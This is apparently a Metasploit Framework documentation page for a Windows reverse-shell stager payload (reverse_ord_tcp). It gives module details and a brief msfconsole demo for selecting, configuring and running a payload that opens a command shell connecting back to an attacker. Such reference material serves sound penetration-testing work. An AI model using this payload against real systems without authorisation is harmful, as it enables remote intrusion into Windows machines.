## Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)

Spawn a piped command shell (staged). Connect back to the 
attacker


## Module Name
payload/windows/shell/reverse_ord_tcp

## Authors
* spoonm
* sf





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/shell/reverse_ord_tcp
msf payload(reverse_ord_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_ord_tcp) > set TARGET <target-id>
msf payload(reverse_ord_tcp) > show options
   ... show and set options ...
msf payload(reverse_ord_tcp) > run
```
    
    